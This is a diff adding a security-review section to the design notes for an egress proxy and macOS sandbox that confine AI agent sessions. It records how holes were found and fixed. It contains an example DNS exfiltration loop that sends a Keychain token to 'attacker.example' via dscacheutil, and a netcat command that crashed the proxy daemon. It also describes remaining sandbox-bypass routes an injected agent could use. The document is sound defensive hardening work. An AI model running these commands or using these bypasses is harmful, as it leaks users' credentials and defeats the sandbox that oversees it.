@@ -1169,6 +1169,56 @@ hard 403 — the filesystem "safety net, not a cage" pattern applied to the netw
   CLI setting a global dispatcher from env — re-verify `proxy-ship-verify.mjs` step (f) on SDK/CLI
   upgrade.
 
+### M4.1 — egress-proxy /review-2 → /address pass (2026-07-16, 2 Fable agents)
+
+The just-shipped proxy went through a 2-agent review (Fable debugger + Fable auditor). It found
+**3 confirmed 🔴** (one was a real hole IN the proxy itself, empirically verified), plus 🟡s/🔵s —
+all addressed on `main` (`affa8d9`…`6eb519e`), 116/116 tests.
+
+- **🔴 DNS/mDNSResponder egress bypassed the proxy** — the big one. `(deny network*)` only blocks
+  the process's OWN sockets; `getaddrinfo`/`dns.lookup`/`dscacheutil`/`ping` resolve via
+  **`mDNSResponder`** over mach IPC, which `(allow default)` still permitted — so DNS queries left
+  the sandbox WITHOUT touching the proxy. **Verified**: under the shipped profile,
+  `socket.getaddrinfo('x.example')` returned a real address, so `for c in $(fold token); do
+  dscacheutil -q host -a name "$c.attacker.example"; done` would exfil the Keychain token label by
+  label. Fix: `(deny mach-lookup (global-name "com.apple.mDNSResponder"[.dnsproxy]))` — all name
+  resolution is now forced through the proxy. **Node/Python divergence that makes this free:** Python's
+  `create_connection` runs `getaddrinfo` even on a numeric IP, but Node skips the resolver when
+  `isIP(host)` is truthy; the CLI reaches the proxy at literal `127.0.0.1` and delegates hostname
+  resolution to the (unsandboxed) proxy via `CONNECT host:443`, so the confined side never needs
+  `getaddrinfo`. Re-verified: getaddrinfo/ping now fail while the CLI auths + resolves context7 MCP
+  through the proxy. Also dropped the blanket `(allow network-outbound (remote unix-socket))`
+  (docker.sock-style local-bridge exposure) and the moot `network-bind` rule.
+- **🔴 allowlisted CONNECT with an out-of-range port crashed the daemon** — `Number("99999")||443`
+  passed validation, and on the ALLOWLISTED path `net.connect(99999,…)` throws `ERR_SOCKET_BAD_PORT`
+  *synchronously*, escaping the handler (no `uncaughtException` handler → whole daemon dies). One
+  `printf 'CONNECT github.com:99999…' | nc 127.0.0.1 <proxyPort>` from a session killed Gumbo. Fix:
+  `parseTarget` validates port 1-65535 + non-empty host + strips IPv6 brackets → null → 403, and
+  `tunnel()`'s `connect()` is try-guarded.
+- **🔴 proxy bind failure crashed/hung** instead of the documented `CLAUDE_PROXY_ERROR` — the listen
+  promise only resolved and there was no server `'error'` handler. Fix: reject on `'error'`, swallow
+  post-listen errors.
+- **🟡s:** empty-host CONNECT reached the daemon's own loopback + IPv6 brackets never matched (both
+  fixed by `parseTarget`); case-sensitive memo re-prompted on case variants; inherited `NO_PROXY`
+  could unroute the CLI (now cleared); proxy leaked on a pre-loop throw (profile build guarded);
+  **overlapping egress confirms corrupted task status** — per-socket escalations can be pending
+  concurrently and outlive the turn, so the Supervisor now depth-counts blocks (status flips only on
+  0↔1) and `manager.setBlocked` won't un-park a task whose runner is gone; egress escalation errors
+  now leave an audit line (were silently denied) and a deny/timeout is no longer misattributed to an
+  active "the user denied".
+- **🔵s:** loopback/RFC1918 IP literals hard-refused (no confirm — SSRF/pivot); distinct-host
+  escalations capped (`MAX_ESCALATIONS`, bounds notch spam + the memo map); transient escalation
+  errors no longer cached (re-escalatable once the supervisor recovers).
+- **Documented residual (delegated egress the single OS layer still can't fully see):** DNS is now
+  closed, but macOS has other out-of-process networking delegates (`nsurlsessiond` XPC, Apple-Events
+  to a browser via `osascript`) that a `(deny network*)` profile can't enumerate exhaustively. The
+  exfil bar is now much higher (no DNS, no direct sockets, secrets unreadable, unknown hosts escalate),
+  but a determined injected session on an exotic delegate isn't provably zero. **Gate on SDK/CLI
+  upgrade:** re-run `m41-spike/proxy-ship-verify.mjs` (CLI+MCP through proxy) AND `dns-fix-probe.mjs`
+  (getaddrinfo blocked). New egress-proxy branches are unit-tested (approve→tunnel, forbidden literals,
+  case-insensitive memo, concurrent-share, thrown-escalation re-escalate, escalation cap, plain-HTTP
+  405, bind-failure fail-closed).
+
 ---
 
 ## Firecrawl content acquisition — scrape/crawl/map/extract for background agents — 2026-07-15
